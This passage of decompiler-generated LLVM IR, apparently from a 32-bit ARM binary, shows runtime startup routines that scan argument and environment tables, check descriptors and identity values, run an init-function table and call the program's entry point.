  uselistorder i32 %v4_12b58, { 1, 0 }
  uselistorder i32 %v0_12b1c, { 1, 0 }
  uselistorder i32 %v4_12b10, { 1, 0 }
  uselistorder i32 %v1_12b18, { 1, 2, 0 }
  uselistorder i32 %v4_12b04, { 1, 0 }
  uselistorder i32 %v1_12b0c, { 1, 2, 0 }
  uselistorder i32 %v4_12af8, { 1, 0 }
  uselistorder i32 %v1_12b00, { 1, 2, 0 }
  uselistorder i32 %v1_12b24, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12af4, { 1, 0 }
  uselistorder i32 %v1_12b20, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12ae0, { 1, 0 }
  uselistorder i32 %v3_12adc, { 1, 0 }
  uselistorder i32 %v1_12adc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12ad8, { 1, 0 }
  uselistorder i32 %v1_12ae0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12acc, { 1, 0 }
  uselistorder i32 %v4_12ac8, { 2, 1, 0 }
  uselistorder i32 %v1_12acc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12ad4.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_12aa0, { 1, 0 }
  uselistorder i32 %v1_12b58, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_12a84, { 1, 0, 2 }
  uselistorder i32 %v0_12a84, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_12a80, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_12bc4, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12b2c, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12ae8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12ad4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_12bac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12bac:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_12bb0 = call i32 @function_12a80()
  ret i32 %v0_12bb0
}

define i32 @function_12bc4() local_unnamed_addr {
dec_label_pc_12bc4:
  %v1_12bcc = call i32 @function_14e3c(i32 8)
  ret i32 %v1_12bcc
}

define i32 @function_12bd8(i32* %arg1) local_unnamed_addr {
dec_label_pc_12bd8:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_12bd8 = load i32, i32* @r4, align 4
  %v6_12bd8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_12be4 = load i32, i32* %arg1, align 4
  store i32 %v2_12be4, i32* @r0, align 4
  %v1_12be8 = call i32 @function_15b6c(i32 %v2_12be4)
  store i32 %v1_12be8, i32* @r5, align 4
  %v0_12bf0 = load i32, i32* @r4, align 4
  %v1_12bf4 = call i32 @function_137cc(i32 %v0_12bf0)
  %v0_12bf8 = load i32, i32* @r5, align 4
  store i32 %v3_12bd8, i32* @r4, align 4
  store i32 %v6_12bd8, i32* @r5, align 4
  ret i32 %v0_12bf8

; uselistorder directives
  uselistorder i32 (i32)* @function_15b6c, { 24, 12, 31, 30, 11, 29, 28, 10, 9, 8, 26, 27, 25, 7, 6, 5, 4, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 3, 2, 0, 1 }
}

define i32 @function_12c08(i32 %arg1) local_unnamed_addr {
dec_label_pc_12c08:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12c08 = load i32, i32* @r7, align 4
  store i32 %v3_12c08, i32* %stack_var_-8, align 4
  %v0_12c10 = load i32, i32* @r0, align 4
  %v2_12c10 = call i32 @function_1312c(i32 %v0_12c10, i32 540672)
  store i32 %v2_12c10, i32* %r0.global-to-local, align 4
  store i32 %v2_12c10, i32* @r7, align 4
  %v1_12c14 = icmp slt i32 %v2_12c10, 0
  br i1 %v1_12c14, label %.thread5, label %dec_label_pc_12c20

.thread5:                                         ; preds = %dec_label_pc_12c08
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c4c

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c08
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12c28 = call i32 @function_13258(i32 1, i32 2080)
  store i32 %v2_12c28, i32* %r0.global-to-local, align 4
  %v2_12c2c = icmp eq i32 %v2_12c28, 0
  br i1 %v2_12c2c, label %dec_label_pc_12c3c, label %.thread.dec_label_pc_12c4c_crit_edge

.thread.dec_label_pc_12c4c_crit_edge:             ; preds = %dec_label_pc_12c20
  store i32 %v2_12c28, i32* %r0.global-to-local, align 4
  %v1_12c34 = load i32, i32* @r7, align 4
  %v3_12c34 = inttoptr i32 %v2_12c28 to i32*
  store i32 %v1_12c34, i32* %v3_12c34, align 4
  %v1_12c50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c4c

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12c20
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12c4c

dec_label_pc_12c4c:                               ; preds = %.thread5, %.thread.dec_label_pc_12c4c_crit_edge, %dec_label_pc_12c3c
  %v1_12c50 = phi i32 [ %v1_12c50.pre, %.thread.dec_label_pc_12c4c_crit_edge ], [ 0, %dec_label_pc_12c3c ], [ 0, %.thread5 ]
  %v2_12c4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12c4c, i32* @r7, align 4
  ret i32 %v1_12c50

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 (i32, i32)* @function_13258, { 34, 4, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1312c, { 5, 7, 6, 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_12c4c, { 2, 1, 0 }
}

define i32 @function_12c54(i32* %arg1) local_unnamed_addr {
dec_label_pc_12c54:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_12c54 = load i32, i32* @r4, align 4
  store i32 %v3_12c54, i32* %stack_var_-12, align 4
  %v1_12c58 = add i32 %tmp, 16
  store i32 %v1_12c58, i32* %r2.global-to-local, align 4
  %v1_12c5c = inttoptr i32 %v1_12c58 to i32*
  %v2_12c5c = load i32, i32* %v1_12c5c, align 4
  store i32 %v2_12c5c, i32* %r2.global-to-local, align 4
  %v3_12c5c = add i32 %tmp, 20
  %v4_12c5c = inttoptr i32 %v3_12c5c to i32*
  %v5_12c5c = load i32, i32* %v4_12c5c, align 4
  store i32 %v5_12c5c, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  %v5_12c6c = icmp slt i32 %v2_12c5c, %v5_12c5c
  br i1 %v5_12c6c, label %dec_label_pc_12cc0, label %dec_label_pc_12c70

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c54
  store i32 217, i32* %r7.global-to-local, align 4
  %v2_12c74 = load i32, i32* %arg1, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 %v2_12c74, i32* %r7.global-to-local, align 4
  %tmp9 = icmp slt i32 %v2_12c74, 1
  br i1 %tmp9, label %dec_label_pc_12c98, label %.dec_label_pc_12cc0_crit_edge

.dec_label_pc_12cc0_crit_edge:                    ; preds = %dec_label_pc_12c70
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_12c74, i32* %v4_12c5c, align 4
  %v5_12c90 = load i32, i32* %r3.global-to-local, align 4
  %v6_12c90 = load i32, i32* %ip.global-to-local, align 4
  %v7_12c90 = add i32 %v6_12c90, 16
  %v8_12c90 = inttoptr i32 %v7_12c90 to i32*
  store i32 %v5_12c90, i32* %v8_12c90, align 4
  %v0_12cc0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12cc0

dec_label_pc_12c98:                               ; preds = %dec_label_pc_12c70
  %v1_12c98 = add i32 %v2_12c74, 2
  %v7_12c98 = icmp eq i32 %v1_12c98, 0
  br i1 %v7_12c98, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_12c98
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_12c98, %bb
  %storemerge = phi i32 [ 1, %bb ], [ %v1_12c98, %dec_label_pc_12c98 ]
  %v0_12ca0 = phi i32 [ 1, %bb ], [ 0, %dec_label_pc_12c98 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %tmp12 = icmp slt i32 %v2_12c74, 0
  %v4_12ca0 = zext i1 %tmp12 to i32
  %v5_12ca0 = and i32 %v0_12ca0, %v4_12ca0
  %v6_12ca0 = icmp eq i32 %v5_12ca0, 0
  br i1 %v6_12ca0, label %bb11, label %dec_label_pc_12cac

bb11:                                             ; preds = %bb10
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12ce8

dec_label_pc_12cac:                               ; preds = %bb10
  %v0_12cac = call i32 @function_12f18()
  %v0_12cb0 = load i32, i32* %r7.global-to-local, align 4
  %v1_12cb0 = sub i32 0, %v0_12cb0
  store i32 %v1_12cb0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v2_12cb8 = inttoptr i32 %v0_12cac to i32*
  store i32 %v1_12cb0, i32* %v2_12cb8, align 4
  br label %dec_label_pc_12ce8

dec_label_pc_12cc0:                               ; preds = %.dec_label_pc_12cc0_crit_edge, %dec_label_pc_12c54
  %v1_12cdc = phi i32 [ %v0_12cc0.pre, %.dec_label_pc_12cc0_crit_edge ], [ %tmp, %dec_label_pc_12c54 ]
  %v1_12cc0 = add i32 %v1_12cdc, 16
  %v2_12cc0 = inttoptr i32 %v1_12cc0 to i32*
  %v3_12cc0 = load i32, i32* %v2_12cc0, align 4
  %v1_12cc4 = add i32 %v1_12cdc, 32
  store i32 %v1_12cc4, i32* %r3.global-to-local, align 4
  %v2_12cc8 = add i32 %v3_12cc0, %v1_12cc4
  store i32 %v2_12cc8, i32* %lr.global-to-local, align 4
  %v1_12ccc = add i32 %v2_12cc8, 16
  %v2_12ccc = inttoptr i32 %v1_12ccc to i16*
  %v3_12ccc = load i16, i16* %v2_12ccc, align 2
  %v4_12ccc = zext i16 %v3_12ccc to i32
  store i32 %v4_12ccc, i32* %r2.global-to-local, align 4
  %v1_12cd0 = add i32 %v2_12cc8, 8
  store i32 %v1_12cd0, i32* %r3.global-to-local, align 4
  %v1_12cd4 = inttoptr i32 %v1_12cd0 to i32*
  %v2_12cd4 = load i32, i32* %v1_12cd4, align 4
  store i32 %v2_12cd4, i32* %r3.global-to-local, align 4
  %v3_12cd4 = add i32 %v2_12cc8, 12
  %v4_12cd4 = inttoptr i32 %v3_12cd4 to i32*
  %v5_12cd4 = load i32, i32* %v4_12cd4, align 4
  store i32 %v5_12cd4, i32* %r4.global-to-local, align 4
  %v2_12cd8 = add i32 %v4_12ccc, %v3_12cc0
  store i32 %v2_12cd8, i32* %r2.global-to-local, align 4
  %v2_12cdc = add i32 %v1_12cdc, 8
  %v3_12cdc = inttoptr i32 %v2_12cdc to i32*
  store i32 %v2_12cd4, i32* %v3_12cdc, align 4
  %v0_12ce0 = load i32, i32* %r4.global-to-local, align 4
  %v1_12ce0 = load i32, i32* %ip.global-to-local, align 4
  %v2_12ce0 = add i32 %v1_12ce0, 12
  %v3_12ce0 = inttoptr i32 %v2_12ce0 to i32*
  store i32 %v0_12ce0, i32* %v3_12ce0, align 4
  %v0_12ce4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ce4 = load i32, i32* %ip.global-to-local, align 4
  %v2_12ce4 = add i32 %v1_12ce4, 16
  %v3_12ce4 = inttoptr i32 %v2_12ce4 to i32*
  store i32 %v0_12ce4, i32* %v3_12ce4, align 4
  br label %dec_label_pc_12ce8

dec_label_pc_12ce8:                               ; preds = %bb11, %dec_label_pc_12cac, %dec_label_pc_12cc0
  %v0_12ce8 = load i32, i32* %lr.global-to-local, align 4
  %v2_12cf0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12cf0, i32* @r4, align 4
  ret i32 %v0_12ce8

; uselistorder directives
  uselistorder i32 %v1_12cdc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* %lr.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_12ce8, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_12cfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12cfc:
  %v1_12cfc = load i32, i32* @r0, align 4
  ret i32 %v1_12cfc
}

define i32 @function_12d00(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_12d00:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %tmp43 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = call i32 @__decompiler_undefined_function_0()
  %tmp45 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v4_12d04 = mul i32 %arg2, 4
  %v5_12d04 = add i32 %v4_12d04, 4
  %v1_12d08 = add i32 %v5_12d04, %tmp
  store i32 %v1_12d08, i32* @r5, align 4
  %v2_12d10 = load i32, i32* %arg3, align 4
  store i32 %v2_12d10, i32* @r7, align 4
  store i32 %v1_12d08, i32* @global_var_2281c.527, align 4
  %v2_12d18 = ptrtoint i32* %stack_var_-208 to i32
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg1, i32* @sl, align 4
  br label %dec_label_pc_12d2c

dec_label_pc_12d2c:                               ; preds = %dec_label_pc_12d2c, %dec_label_pc_12d00
  %v0_12d2c = phi i32 [ %v4_12d30, %dec_label_pc_12d2c ], [ %v1_12d08, %dec_label_pc_12d00 ]
  store i32 %v0_12d2c, i32* @r4, align 4
  %v1_12d30 = inttoptr i32 %v0_12d2c to i32*
  %v2_12d30 = load i32, i32* %v1_12d30, align 4
  store i32 %v2_12d30, i32* %r1.global-to-local, align 4
  %v4_12d30 = add i32 %v0_12d2c, 4
  %v2_12d34 = icmp eq i32 %v2_12d30, 0
  br i1 %v2_12d34, label %dec_label_pc_12d3c, label %dec_label_pc_12d2c

dec_label_pc_12d3c:                               ; preds = %dec_label_pc_12d2c
  store i32 152, i32* %r2.global-to-local, align 4
  store i32 %v2_12d18, i32* %r0.global-to-local, align 4
  %v3_12d44 = bitcast i32* %stack_var_-208 to i8*
  %v4_12d44 = call i32 @function_15594(i8* %v3_12d44, i32 0, i32 152)
  store i32 %v4_12d44, i32* %r0.global-to-local, align 4
  %v0_12d4c = load i32, i32* @r4, align 4
  %v1_12d4c = add i32 %v0_12d4c, 4
  store i32 %v1_12d4c, i32* %r2.global-to-local, align 4
  store i32 %v0_12d4c, i32* %r1.global-to-local, align 4
  store i32 %v1_12d4c, i32* @global_var_22b3c.530, align 4
  %v2_12d7419 = inttoptr i32 %v1_12d4c to i32*
  %v3_12d7420 = load i32, i32* %v2_12d7419, align 4
  %v2_12d7822 = icmp eq i32 %v3_12d7420, 0
  br i1 %v2_12d7822, label %dec_label_pc_12d80, label %dec_label_pc_12d5c.lr.ph

dec_label_pc_12d5c.lr.ph:                         ; preds = %dec_label_pc_12d3c
  %v6_12d64 = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_12d5c

dec_label_pc_12d5c:                               ; preds = %dec_label_pc_12d5c.lr.ph, %dec_label_pc_12d74
  %v4_12d60 = phi i32 [ %v0_12d4c, %dec_label_pc_12d5c.lr.ph ], [ %v1_12d70, %dec_label_pc_12d74 ]
  %v5_12d68 = phi i32 [ %v3_12d7420, %dec_label_pc_12d5c.lr.ph ], [ %v3_12d74, %dec_label_pc_12d74 ]
  %v2_12d5c = icmp ugt i32 %v5_12d68, 36
  %v7_12d5c = icmp eq i32 %v5_12d68, 37
  %v2_12d60 = xor i1 %v2_12d5c, true
  %v3_12d60 = or i1 %v7_12d5c, %v2_12d60
  br i1 %v3_12d60, label %bb, label %.thread38

bb:                                               ; preds = %dec_label_pc_12d5c
  %v5_12d60 = add i32 %v4_12d60, 8
  %v6_12d60 = inttoptr i32 %v5_12d60 to i32*
  %v7_12d60 = load i32, i32* %v6_12d60, align 4
  store i32 %v7_12d60, i32* %r2.global-to-local, align 4
  store i32 %v6_12d64, i32* %r0.global-to-local, align 4
  %v6_12d68 = and i32 %v5_12d68, 1073741824
  %v7_12d68 = icmp ne i32 %v6_12d68, 0
  %v8_12d68 = mul i32 %v5_12d68, 4
  %v9_12d68 = add i32 %v8_12d68, %v6_12d64
  br label %.thread38

.thread38:                                        ; preds = %dec_label_pc_12d5c, %bb
  %v5_12d6c = phi i32 [ %v9_12d68, %bb ], [ %v5_12d68, %dec_label_pc_12d5c ]
  %v1_12d6c23 = phi i1 [ %v7_12d68, %bb ], [ %v2_12d5c, %dec_label_pc_12d5c ]
  %v2_12d6c = xor i1 %v1_12d6c23, true
  %v3_12d6c = or i1 %v7_12d5c, %v2_12d6c
  br i1 %v3_12d6c, label %bb60, label %dec_label_pc_12d74

bb60:                                             ; preds = %.thread38
  %v4_12d6c = load i32, i32* %r2.global-to-local, align 4
  %v6_12d6c = add i32 %v5_12d6c, -176
  %v7_12d6c = inttoptr i32 %v6_12d6c to i32*
  store i32 %v4_12d6c, i32* %v7_12d6c, align 4
  %v0_12d70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12d74

dec_label_pc_12d74:                               ; preds = %.thread38, %bb60
  %v0_12d70 = phi i32 [ %v4_12d60, %.thread38 ], [ %v0_12d70.pre, %bb60 ]
  %v1_12d70 = add i32 %v0_12d70, 8
  store i32 %v1_12d70, i32* %r1.global-to-local, align 4
  %v1_12d74 = add i32 %v0_12d70, 12
  %v2_12d74 = inttoptr i32 %v1_12d74 to i32*
  %v3_12d74 = load i32, i32* %v2_12d74, align 4
  %v2_12d78 = icmp eq i32 %v3_12d74, 0
  br i1 %v2_12d78, label %dec_label_pc_12d74.dec_label_pc_12d80_crit_edge, label %dec_label_pc_12d5c

dec_label_pc_12d74.dec_label_pc_12d80_crit_edge:  ; preds = %dec_label_pc_12d74
  br label %dec_label_pc_12d80

dec_label_pc_12d80:                               ; preds = %dec_label_pc_12d74.dec_label_pc_12d80_crit_edge, %dec_label_pc_12d3c
  store i32 %tmp45, i32* %r2.global-to-local, align 4
  %v0_12da0 = load i32, i32* @r7, align 4
  %v2_12da0 = icmp eq i32 %v0_12da0, 0
  store i32 %tmp45, i32* @global_var_22b44.535, align 4
  br i1 %v2_12da0, label %dec_label_pc_12de4, label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %dec_label_pc_12d80
  store i32 ptrtoint (i32* @global_var_223ec.537 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_12da0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223ec.537 to i32), i32* %r0.global-to-local, align 4
  store i32 %v0_12da0, i32* @global_var_223f0.539, align 4
  store i32 %v0_12da0, i32* @global_var_223ec.537, align 4
  %v1_12dd813 = inttoptr i32 %v0_12da0 to i8*
  %v2_12dd814 = load i8, i8* %v1_12dd813, align 1
  %v2_12ddc16 = icmp eq i8 %v2_12dd814, 0
  br i1 %v2_12ddc16, label %dec_label_pc_12de4, label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %dec_label_pc_12dac, %.thread
  %v1_12dcc = phi i32 [ %v1_12dd4, %.thread ], [ %v0_12da0, %dec_label_pc_12dac ]
  %v0_12dc8.in = phi i8 [ %v2_12dd8, %.thread ], [ %v2_12dd814, %dec_label_pc_12dac ]
  %v7_12dc8 = icmp eq i8 %v0_12dc8.in, 47
  br i1 %v7_12dc8, label %bb61, label %.thread

bb61:                                             ; preds = %dec_label_pc_12dc8
  %v2_12dcc = add i32 %v1_12dcc, 1
  %v2_12dd0 = load i32, i32* %r0.global-to-local, align 4
  %v3_12dd0 = inttoptr i32 %v2_12dd0 to i32*
  store i32 %v2_12dcc, i32* %v3_12dd0, align 4
  %v0_12dd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12dc8, %bb61
  %v0_12dd4 = phi i32 [ %v1_12dcc, %dec_label_pc_12dc8 ], [ %v0_12dd4.pre, %bb61 ]
  %v1_12dd4 = add i32 %v0_12dd4, 1
  store i32 %v1_12dd4, i32* %r1.global-to-local, align 4
  %v1_12dd8 = inttoptr i32 %v1_12dd4 to i8*
  %v2_12dd8 = load i8, i8* %v1_12dd8, align 1
  %v2_12ddc = icmp eq i8 %v2_12dd8, 0
  br i1 %v2_12ddc, label %dec_label_pc_12de4, label %dec_label_pc_12dc8

dec_label_pc_12de4:                               ; preds = %.thread, %dec_label_pc_12dac, %dec_label_pc_12d80
  store i32 %v2_12d18, i32* %r0.global-to-local, align 4
  %v1_12de8 = call i32 @function_15e34(i32 %v2_12d18)
  store i32 %tmp44, i32* @r0, align 4
  %v2_12df8 = call i32 @function_12cfc(i32 %tmp44)
  store i32 %v2_12df8, i32* @r0, align 4
  store i32 %tmp56, i32* %r2.global-to-local, align 4
  %v9_12e04 = icmp eq i32 %tmp56, %tmp43
  br i1 %v9_12e04, label %dec_label_pc_12e0c, label %dec_label_pc_12e28

dec_label_pc_12e0c:                               ; preds = %dec_label_pc_12de4
  store i32 %tmp55, i32* %r2.global-to-local, align 4
  %v9_12e14 = icmp eq i32 %tmp55, %tmp42
  br i1 %v9_12e14, label %dec_label_pc_12e1c, label %dec_label_pc_12e28

dec_label_pc_12e1c:                               ; preds = %dec_label_pc_12e0c
  %v2_12e20 = icmp eq i32 %tmp41, 0
  br i1 %v2_12e20, label %dec_label_pc_12ea4, label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %dec_label_pc_12e0c, %dec_label_pc_12de4, %dec_label_pc_12e1c
  %v2_12e28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12e28, i32* @r4, align 4
  store i32 %v2_12e28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v3_12e38 = bitcast i32* %stack_var_-56 to i8*
  %v4_12e38 = call i32 @function_15594(i8* %v3_12e38, i32 0, i32 24)
  store i32 168, i32* %r7.global-to-local, align 4
  store i32 %v2_12e28, i32* @r0, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12e64

dec_label_pc_12e64:                               ; preds = %bb63, %dec_label_pc_12e28
  %v1_12e64 = phi i32 [ %v1_12e8c, %bb63 ], [ 0, %dec_label_pc_12e28 ]
  %v0_12e64 = load i32, i32* @r4, align 4
  %v2_12e64 = add i32 %v0_12e64, %v1_12e64
  %v1_12e68 = add i32 %v2_12e64, 6
  %v2_12e68 = inttoptr i32 %v1_12e68 to i16*
  %v3_12e68 = load i16, i16* %v2_12e68, align 2
  %v1_12e6c = and i16 %v3_12e68, 32
  %v2_12e6c = icmp eq i16 %v1_12e6c, 0
  br i1 %v2_12e6c, label %bb63, label %dec_label_pc_12e74

dec_label_pc_12e74:                               ; preds = %dec_label_pc_12e64
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_19fc8.542 to i32), i32* @r0, align 4
  store i32 131074, i32* %r1.global-to-local, align 4
  br i1 icmp slt ([10 x i8]* @global_var_19fc8.542, [10 x i8]* null), label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_12e74
  %v3_12e88 = load i32, i32* %ip.global-to-local, align 4
  %v4_12e88 = trunc i32 %v3_12e88 to i8
  %v6_12e88 = inttoptr i32 %v3_12e88 to i8*
  store i8 %v4_12e88, i8* %v6_12e88, align 1
  %v0_12e8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_12e64, %dec_label_pc_12e74, %bb62
  %v0_12e8c = phi i32 [ %v1_12e64, %dec_label_pc_12e64 ], [ %v1_12e64, %dec_label_pc_12e74 ], [ %v0_12e8c.pre, %bb62 ]
  %v1_12e8c = add i32 %v0_12e8c, 8
  store i32 %v1_12e8c, i32* %r2.global-to-local, align 4
  %v7_12e90 = icmp eq i32 %v1_12e8c, 24
  br i1 %v7_12e90, label %dec_label_pc_12e98, label %dec_label_pc_12e64

dec_label_pc_12e98:                               ; preds = %bb63
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_22b34.544, align 4
  br label %dec_label_pc_12ea4

dec_label_pc_12ea4:                               ; preds = %dec_label_pc_12e1c, %dec_label_pc_12e98
  store i32 77488, i32* @lr, align 4
  %v1_12eac = call i32 @function_80b4()
  store i32 %v1_12eac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22304.549 to i32), i32* %r7.global-to-local, align 4
  br i1 icmp uge (i32* @global_var_22300.547, i32* @global_var_22304.549), label %dec_label_pc_12ed0, label %dec_label_pc_12ebc

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12ebc, %dec_label_pc_12ea4
  %v0_12ebc = phi i32 [ %v4_12ebc, %dec_label_pc_12ebc ], [ ptrtoint (i32* @global_var_22300.547 to i32), %dec_label_pc_12ea4 ]
  %v1_12ebc = inttoptr i32 %v0_12ebc to i32*
  %v2_12ebc = load i32, i32* %v1_12ebc, align 4
  %v4_12ebc = add i32 %v0_12ebc, 4
  call void @__pseudo_branch(i32 %v2_12ebc)
  %v1_12ec8 = load i32, i32* %r7.global-to-local, align 4
  %v3_12ec8 = icmp ult i32 %v4_12ebc, %v1_12ec8
  br i1 %v3_12ec8, label %dec_label_pc_12ebc, label %dec_label_pc_12ed0

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12ebc, %dec_label_pc_12ea4
  %v0_12ed0 = load i32, i32* @r6, align 4
  store i32 %v0_12ed0, i32* %r1.global-to-local, align 4
  %v0_12ed4 = load i32, i32* @r5, align 4
  store i32 %v0_12ed4, i32* %r2.global-to-local, align 4
  %v0_12ed8 = load i32, i32* @r8, align 4
  store i32 %v0_12ed8, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_12ee4 = call i32 @function_12f30(i32 %v0_12ed8)
  store i32 %v1_12ee4, i32* %r0.global-to-local, align 4
  ret i32 %v1_12ee4

; uselistorder directives
  uselistorder i32 %v0_12ebc, { 1, 0 }
  uselistorder i32 %v1_12e8c, { 1, 2, 0 }
  uselistorder i32 %v1_12e64, { 1, 2, 0 }
  uselistorder i8 %v2_12dd8, { 1, 0 }
  uselistorder i32 %v1_12dd4, { 1, 2, 0 }
  uselistorder i32 %v0_12da0, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 %v3_12d74, { 1, 0 }
  uselistorder i32 %v1_12d70, { 1, 0 }
  uselistorder i32 %v0_12d70, { 1, 0 }
  uselistorder i1 %v2_12d5c, { 1, 0 }
  uselistorder i32 %v5_12d68, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_12d2c, { 2, 1, 0 }
  uselistorder i32 %v2_12d18, { 1, 0, 2 }
  uselistorder i32 %tmp56, { 1, 0 }
  uselistorder i32 %tmp55, { 1, 0 }
  uselistorder i32 %tmp44, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 10, 6, 7, 8, 9, 13, 14, 11, 12, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 1, 9, 5, 6, 7, 8, 2, 10, 0 }
